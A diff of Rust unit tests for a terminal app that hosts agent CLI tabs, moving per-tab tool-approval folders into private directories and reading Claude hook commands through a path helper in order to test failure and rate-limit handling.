-        std::fs::create_dir_all(&tab1_approvals_dir).unwrap();
+        let tab1_approvals_dir = crate::agent_approval_channel::tab_approvals_dir(&st.session_dir, tab1_id).expect("a private approvals folder");
+        crate::agent_approval_channel::create_private_dir_all(&tab1_approvals_dir).unwrap();
         let req_path = tab1_approvals_dir.join("4001-Bash.request.json");
         let req = serde_json::json!({
             "id": "4001-Bash",
@@ -10214,12 +10703,12 @@ mod tests {
         assert_eq!(st.pending_approvals.len(), 1);
 
         // Open a second tab, give it its own per-tab pending approval, and close Tab 2:
-        // Tab 2's request in approvals/tab-<tab2_id>/ must be withdrawn while Tab 1's request in approvals/tab-<tab1_id>/ survives.
+        // Tab 2's request in its own private tab folder must be withdrawn while Tab 1's request in its folder survives.
         let _ = st.spawn_tab(AgentCliPreset::Shell, None);
         assert_eq!(st.tabs.len(), 2);
         let tab2_id = st.tabs[1].id;
-        let tab2_approvals_dir = crate::agent_permissions::tab_approvals_dir(&st.session_dir, tab2_id);
-        std::fs::create_dir_all(&tab2_approvals_dir).unwrap();
+        let tab2_approvals_dir = crate::agent_approval_channel::tab_approvals_dir(&st.session_dir, tab2_id).expect("a private approvals folder");
+        crate::agent_approval_channel::create_private_dir_all(&tab2_approvals_dir).unwrap();
         let tab2_req_path = tab2_approvals_dir.join("4002-Bash.request.json");
         let tab2_ans_path = tab2_approvals_dir.join("4002-Bash.answer");
         let tab2_req = serde_json::json!({
@@ -10888,6 +11377,14 @@ mod tests {
             assert!(texts_nosel.iter().any(|t| t.text == expected.label), "NoSelection prompt label {:?} must be painted: {:?}", expected.label, texts_nosel);
         }
         kill_tabs(&mut st);
+    }
+
+    /// Runs last among the tests `real_cli_launch_tests` starts in a child process (the name sorts after theirs), so that a CLI
+    /// the earlier tests started in the background has run before the child exits. Skipped in a normal run.
+    #[test]
+    #[ignore = "only the real-CLI launch check runs this, last, in a child process"]
+    fn zz_let_background_launches_finish() {
+        std::thread::sleep(std::time::Duration::from_millis(1500));
     }
 
     #[test]
@@ -11689,7 +12186,7 @@ mod tests {
                 log.push_str("API Error: 529 overloaded_error\n");
             }
         }
-        let claude_hooks = read_json(&st.session_dir.join("hooks.json"));
+        let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let stop_failure_cmd = claude_hooks["hooks"]["StopFailure"][0]["hooks"][0]["command"].as_str().expect("StopFailure hook command").to_string();
         run_hook_command(&stop_failure_cmd);
         let _ = st.poll_live_agent_bridge();
@@ -11729,7 +12226,7 @@ mod tests {
                 log.push_str("API Error: 529 overloaded_error\n");
             }
         }
-        let claude_hooks = read_json(&st.session_dir.join("hooks.json"));
+        let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let stop_failure_cmd = claude_hooks["hooks"]["StopFailure"][0]["hooks"][0]["command"].as_str().expect("StopFailure hook command").to_string();
         run_hook_command(&stop_failure_cmd);
         let _ = st.poll_live_agent_bridge();
@@ -11752,7 +12249,7 @@ mod tests {
         let tab = TerminalTab::spawn_with_session_cmd(1, AgentCliPreset::Claude, 24, 80, None, None, Some(cmd)).expect("spawn stub tab");
         st.tabs = vec![tab];
         st.active_tab = 0;
-        let claude_hooks = read_json(&st.session_dir.join("hooks.json"));
+        let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let stop_failure_cmd = claude_hooks["hooks"]["StopFailure"][0]["hooks"][0]["command"].as_str().expect("StopFailure hook command").to_string();
         let raise_failure = |st: &mut TerminalState| {
             if let Some(t) = st.active_tab_mut() {
@@ -11871,7 +12368,7 @@ mod tests {
     fn a_stale_turn_offset_inside_a_multibyte_char_does_not_panic_the_stop_failure_scan() {
         let mut st = provisioned_session(686_010);
         quiet_claude_tab_into(&mut st);
-        let hooks = read_json(&st.session_dir.join("hooks.json"));
+        let hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let stop_failure_cmd = hooks["hooks"]["StopFailure"][0]["hooks"][0]["command"].as_str().expect("StopFailure hook command").to_string();
         kill_tabs_after(&mut st, |st| {
             let tab = st.active_tab_mut().unwrap();
@@ -11973,7 +12470,7 @@ mod tests {
         st.tabs = vec![tab1, tab2];
         st.active_tab = 1; // Shell tab is active while Claude tab finishes with StopFailure
 
-        let claude_hooks = read_json(&st.session_dir.join("hooks.json"));
+        let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let stop_failure_cmd = claude_hooks["hooks"]["StopFailure"][0]["hooks"][0]["command"].as_str().expect("StopFailure hook command").to_string();
         run_hook_command(&stop_failure_cmd);
         let _ = st.poll_live_agent_bridge();
@@ -12004,7 +12501,7 @@ mod tests {
         let _ = st.poll_live_agent_bridge();
         assert_eq!(st.active_tab().and_then(|t| t.session_failure.as_ref().map(|f| f.class)), Some(SessionFailureClass::RateLimited));
 
-        let claude_hooks = read_json(&st.session_dir.join("hooks.json"));
+        let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         for hook_name in ["PreToolUse", "PostToolUse"] {
             let tool_cmd = claude_hooks["hooks"][hook_name][0]["hooks"][0]["command"].as_str().expect("tool hook command").to_string();
             run_hook_command(&tool_cmd);
@@ -12251,7 +12748,7 @@ mod tests {
 
         /// Command of the Claude `UserPromptSubmit` hook currently provisioned in `st`'s session dir.
         fn claude_prompt_hook_command(st: &TerminalState) -> String {
-            let hooks = read_json(&st.session_dir.join("hooks.json"));
+            let hooks = read_json(&crate::agent_permissions::claude_hooks_path(st));
             hooks["hooks"]["UserPromptSubmit"][0]["hooks"][0]["command"].as_str().expect("UserPromptSubmit command").to_string()
         }
 
@@ -12766,7 +13263,7 @@ mod tests {
             st_claude.start_bootstrap_job_held(fx.doc.clone_without_images(), fx.page1, Some(file_path.clone()), Some(hold));
             let build = in_flight_job(&st_claude);
 
-            let claude_hooks = read_json(&st_claude.session_dir.join("hooks.json"));
+            let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st_claude));
             let hook_cmd = claude_hooks["hooks"]["UserPromptSubmit"][0]["hooks"][0]["command"].as_str().unwrap();
             let hook_turn_1 = run_hook_command(hook_cmd);
             assert!(!job_is_done(&build), "Claude hook must bound its wait: it answered while the full build was still held back");
